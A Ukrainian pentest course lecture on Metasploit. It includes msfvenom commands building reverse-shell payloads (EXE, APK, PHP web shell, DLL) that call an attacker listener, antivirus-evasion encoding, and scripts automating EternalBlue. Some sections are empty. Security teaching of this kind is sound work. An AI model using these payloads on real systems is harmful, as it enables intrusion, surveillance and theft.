Фреймворк Metasploit та експлуатація

2 год Нова

5.1 Вступ до експлуатації вразливостей

У попередніх лекціях ми розглянули розвідку (OSINT) та сканування мережі (Nmap, enumeration). Тепер ми переходимо до наступного критичного етапу — експлуатації вразливостей. Саме на цьому етапі пентестер перетворює зібрану інформацію про відкриті порти, сервіси та їх версії на реальний доступ до цільової системи.

Експлуатація (exploitation) — це процес використання вразливості (vulnerability) у програмному забезпеченні, конфігурації або протоколі для виконання несанкціонованих дій: отримання доступу, підвищення привілеїв, викрадення даних або порушення роботи системи.

Вразливість, експлойт та експлуатація

Ці три терміни часто плутають, але вони мають чітко різні значення:

Термін Визначення Приклад
Вразливість (Vulnerability) Слабке місце у системі — помилка в коді, некоректна конфігурація або недолік протоколу Buffer overflow у SMBv1 (CVE-2017-0144)
Експлойт (Exploit) Програмний код або послідовність дій, що використовує вразливість EternalBlue — експлойт для CVE-2017-0144
Експлуатація (Exploitation) Процес застосування експлойту для досягнення мети (доступ, RCE, DoS) Запуск EternalBlue через Metasploit для отримання Meterpreter-сесії

Cyber Kill Chain (Lockheed Martin, 2011)

Модель Cyber Kill Chain, розроблена Lockheed Martin у 2011 році, описує 7 фаз кібератаки. Експлуатація є четвертою фазою — без неї атакуючий не може отримати доступ до системи:

# Фаза Kill Chain Опис Еквівалент у пентесті
1 Reconnaissance Збір інформації про ціль OSINT, Google Dorks, Shodan (Лекція 3)
2 Weaponization Створення зброї: малвар + експлойт msfvenom, генерація payload
3 Delivery Доставка до цілі (email, USB, web) Фішинг, соціальна інженерія, web exploit
4 Exploitation Спрацювання експлойту на цільовій системі Metasploit exploit, ручна експлуатація
5 Installation Встановлення бекдору / persistence Meterpreter, web shell, cron job
6 Command & Control Канал зв'язку з атакуючим Reverse shell, C2 framework
7 Actions on Objectives Досягнення мети: крадіжка, знищення Exfiltration, pivoting, lateral movement

Фази PTES з фокусом на експлуатацію

Згідно зі стандартом PTES (Penetration Testing Execution Standard), експлуатація є п'ятою фазою:

  1. Pre-engagement Interactions — домовленості та scope
  2. Intelligence Gathering — пасивна розвідка (Лекція 3)
  3. Threat Modeling — моделювання загроз
  4. Vulnerability Analysis — сканування та enumeration (Лекція 4)
  5. Exploitation — експлуатація вразливостей (ця лекція)
  6. Post-Exploitation — дії після отримання доступу (Лекція 9)
  7. Reporting — звітування (Лекція 12)

Типи експлойтів

Тип Опис Вектор атаки Приклад
Remote (мережевий) Атака на мережевий сервіс без попереднього доступу Відкритий порт з вразливим сервісом EternalBlue (SMB), Log4Shell (HTTP)
Local (локальний) Підвищення привілеїв при наявності обмеженого доступу Вразливість у ядрі або SUID-бінарнику DirtyPipe (CVE-2022-0847), DirtyCow
Client-side Атака на клієнтський додаток (браузер, PDF, Office) Користувач відкриває шкідливий файл або URL Browser exploit kit, шкідливий PDF
Web Application Атака на веб-додаток через HTTP Ін'єкція у параметри запиту SQL Injection, RCE через deserialization
Denial of Service (DoS) Порушення доступності сервісу Переповнення буферу без виконання коду SlowLoris, SYN Flood, Ping of Death
Privilege Escalation Підвищення привілеїв від user до root/SYSTEM Misconfiguration, kernel exploit PrintNightmare (CVE-2021-34527)

Zero-day vs N-day

  • Zero-day (0-day) — вразливість, для якої ще не існує офіційного патча. Назва означає «нуль днів з моменту публікації патча». Такі вразливості найцінніші: ціна на чорному ринку — від $50,000 до $2,500,000 (Zerodium, 2024). Приклади: Stuxnet використовував 4 zero-day; Pegasus (NSO Group) — ланцюжок zero-day для iOS.
  • N-day — вразливість, для якої патч існує N днів, але ціль його ще не встановила. Більшість реальних зламів використовують саме N-day: патч вже доступний, але адміністратори зволікають з оновленням. За даними Mandiant (2024), середній час від публікації CVE до масової експлуатації — 5 днів.

Правовий та етичний фреймворк

Експлуатація вразливостей — це найбільш юридично ризикований етап пентесту. Обов'язкові вимоги:

  • Письмовий дозвіл (Rules of Engagement) — підписаний документ із чітким scope: IP-адреси, домени, порти, дозволені методи та часові рамки
  • Scope limitations — ніколи не виходити за межі авторизованого scope. Навіть випадковий pivot на чужу систему може мати юридичні наслідки
  • Computer Fraud and Abuse Act (CFAA, США) — федеральний закон, що криміналізує несанкціонований доступ до комп'ютерних систем (до 20 років ув'язнення)
  • EU Directive 2013/40/EU — директива ЄС про атаки на інформаційні системи: криміналізує незаконний доступ, перехоплення, втручання
  • Кримінальний кодекс України, ст. 361-363 — несанкціоноване втручання в роботу ЕОМ, створення та розповсюдження шкідливих програм
  • Get-Out-of-Jail Letter — документ від замовника, що підтверджує авторизацію тестування. Пентестер має мати його при собі під час фізичних тестів

5.2 Архітектура Metasploit Framework

Metasploit Framework (MSF) — це найпопулярніша у світі платформа для тестування на проникнення та розробки експлойтів. Це відкритий (open-source) проєкт, що надає інфраструктуру для написання, тестування та використання exploit-коду. Metasploit перетворив процес експлуатації з рутинного ручного кодування на структуровану, модульну систему.

Хронологія розвитку

Рік Подія Деталі
2003 Створення MSF 1.0 HD Moore (H.D. Moore), написано на Perl, 11 експлойтів
2004 MSF 2.0 Повне переписування, модульна архітектура
2007 MSF 3.0 Переписано на Ruby, 177 експлойтів, 104 payload'и
2009 Придбання Rapid7 Rapid7 купує проєкт, HD Moore продовжує розробку
2011 MSF 4.0 Metasploit Pro, GUI, веб-інтерфейс
2019 MSF 5.0 Нові бази даних, evasion-модулі, метадані, JSON RPC
2020 MSF 6.0 Шифрування сесій, SMBv3 клієнт, покращення продуктивності
2024 MSF 6.4 2300+ експлойтів, ARM64 Meterpreter, indirect syscalls
2025 MSF 6.4.x (поточна) 139 нових модулів за 2024 рік, SMB-to-LDAP relay, нові типи сесій

Rex Library (Ruby Extension Library)

Фундаментальний рівень, що надає базові компоненти:

  • Сокети — TCP, UDP, SSL/TLS клієнти та сервери
  • Протоколи — реалізації SMB, HTTP, SSH, FTP, DCERPC, NTLM та інших
  • Кодування — Base64, XOR, Unicode, та інші трансформації
  • Асемблер — генерація шелл-коду для x86, x64, ARM
  • Текст — рандомізація, обфускація, форматування

MSF Core

Ядро фреймворку, що забезпечує базову функціональність:

  • Module Manager — завантаження, пошук та управління модулями
  • Session Manager — відстеження та управління активними сесіями (shell, Meterpreter)
  • Event Dispatcher — система подій для інтеграції компонентів
  • DataStore — глобальне та локальне сховище параметрів (RHOSTS, LHOST, PAYLOAD тощо)
  • Plugin Manager — динамічне завантаження плагінів

MSF Base

Спрощений API-рівень, що обгортає MSF Core та надає зручні методи для розробників модулів. Містить mixins — модулі Ruby, що додають функціональність: Msf::Exploit::Remote::Tcp, Msf::Exploit::Remote::HttpClient, Msf::Auxiliary::Scanner тощо.

5.3 Модулі Metasploit

Модулі — це будівельні блоки Metasploit. Кожен модуль — це окремий Ruby-скрипт, що виконує конкретне завдання. Модульна архітектура дозволяє легко додавати нову функціональність та комбінувати компоненти.

Post-exploitation модулі

Запускаються після отримання сесії для збору даних та закріплення:

  • post/windows/gather/hashdump — дамп хешів паролів із SAM
  • post/multi/recon/local_exploit_suggester — пошук локальних експлойтів для privilege escalation
  • post/windows/manage/migrate — міграція Meterpreter у інший процес
  • post/windows/gather/enum_domain — перелічення домену Active Directory
  • post/linux/gather/enum_configs — збір конфігурацій Linux-системи
  • post/multi/manage/shell_to_meterpreter — апгрейд shell до Meterpreter

Encoders

Кодувальники обфускують payload для обходу сигнатурного аналізу антивірусів та виключення «поганих байтів» (bad characters):

  • x86/shikata_ga_nai — поліморфний XOR-кодувальник, найпопулярніший. Генерує унікальний декодер при кожному запуску
  • x86/fnstenv_mov — використовує FPU-інструкції для визначення адреси
  • cmd/powershell_base64 — Base64-кодування для PowerShell
  • php/base64 — Base64-кодування для PHP payload

Увага: сучасні антивіруси (2024-2025) використовують поведінковий аналіз та машинне навчання. Самі по собі encoder'и більше не є достатніми для обходу антивірусів — вони корисні переважно для виключення bad characters та базової обфускації.

NOP-генератори та Evasion-модулі

NOP-генератори створюють послідовності інструкцій «No Operation» для вирівнювання payload у пам'яті при buffer overflow-атаках. NOP-слайд збільшує ймовірність потрапити на початок shellcode.

Evasion-модулі (додані у MSF 5.0) генерують виконувані файли, що обходять конкретні антивірусні рішення:

  • evasion/windows/windows_defender_exe — обхід Windows Defender
  • evasion/windows/windows_defender_js_hta — обхід через HTA-файл

Конвенція іменування модулів

Кожен модуль має шлях, що відображає його тип, платформу, сервіс та назву:

# Формат: тип/платформа/сервіс/назва
exploit/windows/smb/ms17_010_eternalblue
│       │       │   └── назва (CVE або опис)
│       │       └── сервіс (smb)
│       └── платформа (windows)
└── тип (exploit)

# Інші приклади:
auxiliary/scanner/portscan/tcp
post/windows/gather/hashdump
payload/windows/meterpreter/reverse_tcp
encoder/x86/shikata_ga_nai
nop/x86/opty2

# Пошук за ключовим словом

# Пошук за CVE
msf6 > search cve:2017-0144

# Пошук за типом
msf6 > search type:exploit platform:windows smb

# Пошук за платформою та рангом

# Пошук за автором
msf6 > search author:hdm

# Пошук за шляхом
msf6 > search path:smb

# Комбінований пошук

# Переглянути доступні пейлоади

# Переглянути цілі (targets)
msf6 exploit(ms17_010_eternalblue) > show targets

# Повна інформація про модуль
msf6 exploit(ms17_010_eternalblue) > info

# Повернутись назад
msf6 exploit(ms17_010_eternalblue) > back

5.4 Пейлоади та шелл-коди

Payload (пейлоад, корисне навантаження) — це код, який виконується на цільовій системі після успішної експлуатації вразливості. Якщо експлойт — це «ключ», що відкриває двері, то payload — це «людина», що входить у двері та виконує завдання.

Три категорії пейлоадів

Категорія Опис Розмір Нейминг Приклад
Singles (Inline) Самостійний payload, що містить весь код. Не потребує додаткового завантаження Більший Символ _ (підкреслення) windows/shell_reverse_tcp
Stagers Маленький код, що встановлює мережевий канал та завантажує Stage Мінімальний (~350 байт) Символ / (слеш) windows/meterpreter/reverse_tcp
Stages Повнофункціональний payload, завантажений Stager'ом (Meterpreter, VNC inject тощо) Великий (до МБ) Частина після / meterpreter у windows/meterpreter/reverse_tcp

Ключова різниця у назві:

# Staged payload (stager + stage) — символ /
windows/meterpreter/reverse_tcp
         │           │
         stage       stager

# Stageless payload (inline/single) — символ _
windows/meterpreter_reverse_tcp
         │
         усе в одному файлі

Staged vs Stageless

Характеристика Staged (stager + stage) Stageless (inline)
Розмір початкового payload Малий (~350 байт для stager) Великий (весь код одразу)
Мережевий трафік Додаткове завантаження stage після з'єднання Одноразова передача
Виявлення AV Stager менш помітний; stage завантажується в пам'ять Більше сигнатур у одному файлі
Надійність Залежить від стабільного з'єднання для stage Вищий — весь код вже на місці
Обмеження буферу Підходить для малих буферів Потребує більшого простору
Використання Стандартний вибір у Metasploit Нестабільні мережі, restricted environments

Bind Shell vs Reverse Shell

Характеристика Bind Shell Reverse Shell
Напрямок з'єднання Ціль відкриває порт, атакуючий підключається Ціль підключається до атакуючого
Фаєрвол (вхідний) Блокує — порт на цілі закритий для вхідних Пропускає — це вихідне з'єднання
NAT Проблема — ціль за NAT недоступна Працює — ціль ініціює з'єднання назовні
Виявлення Незвичний відкритий порт на цілі Вихідне з'єднання — менш підозріле
Payload у Metasploit windows/meterpreter/bind_tcp windows/meterpreter/reverse_tcp

Чому reverse shell переважає: більшість мережевих середовищ налаштовані блокувати вхідні з'єднання, але дозволяють вихідні (щоб користувачі могли відвідувати веб-сайти). Reverse shell використовує цю асиметрію. Крім того, NAT зазвичай перешкоджає bind shell, бо зовнішній атакуючий не може підключитися до внутрішньої IP-адреси.

Meterpreter — Meta-Interpreter

Meterpreter — це найпотужніший payload у Metasploit. Це повнофункціональний агент, що працює виключно в оперативній пам'яті (in-memory), не залишаючи файлів на диску. Комунікація шифрується за допомогою AES-256 (з MSF 6.0).

Ключові властивості Meterpreter:

  • In-memory execution — працює в пам'яті процесу, не створює файлів на диску
  • Encrypted communication — весь трафік шифрується (TLS + AES)
  • Reflective DLL injection — завантажується через reflective injection без торкання диску
  • Extensible — можна завантажувати додаткові модулі (kiwi, incognito, stdapi) динамічно
  • Migration — може мігрувати між процесами для стабільності та стелсу

Можливості Meterpreter за категоріями

Категорія Команди Опис
Система sysinfo, getuid, getpid, ps, kill Інформація про систему, поточний користувач, процеси
Привілеї getsystem, getprivs Підвищення до SYSTEM через різні техніки (Named Pipe, Token Duplication)
Файлова система upload, download, cat, edit, ls, cd, mkdir, rm Повний доступ до файлової системи
Мережа portfwd, route, arp, netstat, ifconfig Портфорвардинг, маршрутизація, мережева інформація
Процеси migrate, execute, ps, steal_token Міграція в інший процес, виконання команд, крадіжка токенів
Облікові дані hashdump, load kiwi, creds_all, lsa_dump_sam Дамп хешів, Mimikatz через kiwi-розширення, LSA secrets
Кейлогінг keyscan_start, keyscan_dump, keyscan_stop Запис натискань клавіш
Зняття екрану screenshot, screenshare Знімок та потокове відео екрану
Веб-камера webcam_snap, webcam_stream, webcam_list Фото та відео з камери
Pivoting autoroute, portfwd add, socks_proxy Маршрутизація через скомпрометовану машину в інші мережі

Linux x64 Linux 64-bit linux/x64/meterpreter/reverse_tcp

Практичний гайд вибору payload

  • Windows-ціль з прямим з'єднанням: windows/x64/meterpreter/reverse_tcp — стандартний вибір
  • Ціль за фаєрволом (лише HTTP): windows/x64/meterpreter/reverse_https — маскується під HTTPS-трафік
  • Малий буфер (обмежений простір для shellcode): windows/meterpreter/reverse_tcp — staged, малий stager
  • Нестабільна мережа: windows/x64/meterpreter_reverse_tcp — stageless, весь код одразу
  • Linux-ціль: linux/x64/meterpreter/reverse_tcp
  • Веб-сервер PHP: php/meterpreter/reverse_tcp
  • Просто виконати команду: cmd/unix/reverse_bash або windows/exec

5.5 Бази вразливостей та CVE

Перед експлуатацією необхідно знайти відповідний експлойт. Для цього пентестери використовують систему стандартизованої ідентифікації вразливостей — CVE (Common Vulnerabilities and Exposures) — та спеціалізовані бази даних.

Система CVE

CVE (Common Vulnerabilities and Exposures) — це стандартна система ідентифікації відомих вразливостей, підтримувана організацією MITRE Corporation за фінансування CISA (Cybersecurity and Infrastructure Security Agency, США).

  • Формат: CVE-YYYY-NNNNN — рік + послідовний номер (до 7 цифр з 2014 року)
  • CNA (CVE Numbering Authorities): 433 організації у 40 країнах мають право призначати CVE-ідентифікатори (серед них: Microsoft, Google, Red Hat, Apache, MITRE)
  • Статистика 2024: 40,009 нових CVE опубліковано — зростання 38% порівняно з 2023 (28,961)
  • Мета: єдина мова для ідентифікації вразливостей між різними інструментами, базами та організаціями

NVD (National Vulnerability Database)

NVD (National Vulnerability Database) — база даних NIST (National Institute of Standards and Technology), що збагачує CVE-записи додатковою інформацією:

  • CVSS Score — числова оцінка серйозності
  • CPE (Common Platform Enumeration) — які продукти уражені
  • CWE (Common Weakness Enumeration) — класифікація типу вразливості
  • Посилання — патчі, advisory, PoC-коди

CVSS v3.1 — базові метрики

CVSS (Common Vulnerability Scoring System) — стандарт оцінки серйозності вразливостей. Поточна широко використовувана версія — CVSS v3.1 (червень 2019):

Метрика Значення Опис
Attack Vector (AV) Network / Adjacent / Local / Physical Звідки можна експлуатувати: мережа, сусідня мережа, локально, фізично
Attack Complexity (AC) Low / High Складність умов для експлуатації
Privileges Required (PR) None / Low / High Рівень привілеїв, необхідний атакуючому
User Interaction (UI) None / Required Чи потрібна дія від користувача
Scope (S) Unchanged / Changed Чи впливає експлуатація на інші компоненти
Confidentiality (C) None / Low / High Вплив на конфіденційність даних
Integrity (I) None / Low / High Вплив на цілісність даних
Availability (A) None / Low / High Вплив на доступність системи

Рівні серйозності CVSS

Рівень Діапазон балів Приклад
None 0.0 Інформаційне повідомлення
Low 0.1 — 3.9 Інформаційний витік (cookie без HttpOnly)
Medium 4.0 — 6.9 Stored XSS, CSRF
High 7.0 — 8.9 SQL Injection, Local Privilege Escalation
Critical 9.0 — 10.0 Remote Code Execution без автентифікації (Log4Shell, EternalBlue)

CVSS v4.0

CVSS v4.0 опубліковано організацією FIRST у листопаді 2023 року. Основні зміни:

  • Нові групи метрик: Supplemental (Automatable, Recovery, Provider Urgency) — додаткова контекстуальна інформація
  • Granularity: окремі оцінки для Vulnerable System та Subsequent System (замість одного Scope)
  • Attack Requirements (AT): нова метрика, що замінює частину Attack Complexity
  • Нова номенклатура: CVSS-B (Base), CVSS-BT (Base+Threat), CVSS-BE (Base+Environmental), CVSS-BTE (повна)
  • Зворотна несумісність із v3.1 — бали не можна порівнювати напряму

Бази вразливостей

База URL Тип Особливості

SearchSploit — офлайн пошук експлойтів

# Базовий пошук

# Пошук за CVE
searchsploit --cve 2017-0144

# Пошук тільки за заголовком (без шляху)
searchsploit -t apache struts

# Скопіювати експлойт у поточну директорію

# Вивід у JSON

Практичний workflow пошуку

  1. Ідентифікація: Nmap визначив vsftpd 2.3.4 на порту 21
  2. Пошук CVE: searchsploit vsftpd 2.3.4 — знаходимо CVE-2011-2523
  3. Перевірка CVSS: NVD показує CVSS 9.8 (Critical) — pre-auth backdoor
  4. Пошук модуля MSF: search vsftpd в msfconsole — exploit/unix/ftp/vsftpd_234_backdoor
  5. Верифікація: info для перевірки версій та платформ
  6. Експлуатація: use — set RHOSTS — exploit

5.7 Класичні експлойти та кейси

Розуміння класичних експлойтів є критично важливим для пентестера. Кожен із наведених нижче кейсів ілюструє різний тип вразливості, різний вектор атаки та різний масштаб впливу. Ці експлойти часто зустрічаються у навчальних CTF та реальних пентестах застарілих систем.

5.8 Автоматизація та інтеграція

msfvenom — генератор payload'ів

msfvenom — це уніфікований інструмент для генерації payload'ів та їх кодування, що замінив старі msfpayload та msfencode (об'єднані у 2015 році). Синтаксис:

msfvenom -p <payload> [options] -f <format> -o <output_file>

Типові команди msfvenom

# Windows EXE (reverse TCP Meterpreter, x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o payload.exe

# Windows EXE (stageless, для нестабільних мереж)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f exe -o payload_stageless.exe

# Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f elf -o payload.elf

# Android APK
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -o payload.apk

# PHP Web Shell
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o shell.php

# Python payload
msfvenom -p python/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f raw -o payload.py

# PowerShell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f psh -o payload.ps1

# Java WAR (для Tomcat)
msfvenom -p java/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f war -o payload.war

# MSI installer
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f msi -o payload.msi

# DLL (для DLL hijacking)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -f dll -o payload.dll

Кодування (Encoding)

# Кодування shikata_ga_nai (поліморфний XOR)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o encoded_payload.exe

# Виключення bad characters (null byte, newline, CR)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.50 LPORT=4444 \
  -b '\x00\x0a\x0d' \
  -f exe -o clean_payload.exe

# Список доступних encoder'ів
msfvenom --list encoders

# Список payload'ів
msfvenom --list payloads

Resource Scripts (.rc файли)

Resource scripts — це текстові файли з командами msfconsole, що дозволяють автоматизувати повторювані задачі. Підтримують ERB-шаблони (Embedded Ruby) для динамічного вмісту:

# Файл: eternalblue_auto.rc
# Автоматична експлуатація EternalBlue

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LPORT 4444
exploit -j
# Файл: listener.rc
# Універсальний reverse handler

use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false
exploit -j -z
# ERB-шаблон: scan_and_exploit.rc
# Ruby-код всередині resource script

<ruby>
framework.db.hosts.each do |host|
  run_single("use auxiliary/scanner/smb/smb_ms17_010")
  run_single("set RHOSTS #{host.address}")
  run_single("run")
end
</ruby>
# Запуск resource scripts
msfconsole -r eternalblue_auto.rc        # При старті
msf6 > resource listener.rc              # Під час роботи
msf6 > makerc /tmp/session.rc            # Зберегти історію команд як RC

Metasploit API

  • RPC API (MessagePack): основний API для автоматизації. Порт 55553. Використовує MessagePack для серіалізації. Підтримка: Ruby, Python (pymetasploit3), Java
  • REST API (Pro): RESTful JSON API — тільки у Metasploit Pro. Дозволяє керувати усіма функціями через HTTP-запити
  • Ruby API: прямий доступ до MSF Core через Ruby-скрипти — найпотужніший та найгнучкіший варіант
# Приклад Python-автоматизації через pymetasploit3
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('password', port=55553)
exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
exploit['RHOSTS'] = '192.168.1.100'
exploit['LHOST'] = '192.168.1.50'
payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
exploit.execute(payload=payload)

# Перегляд сесій
print(client.sessions.list)
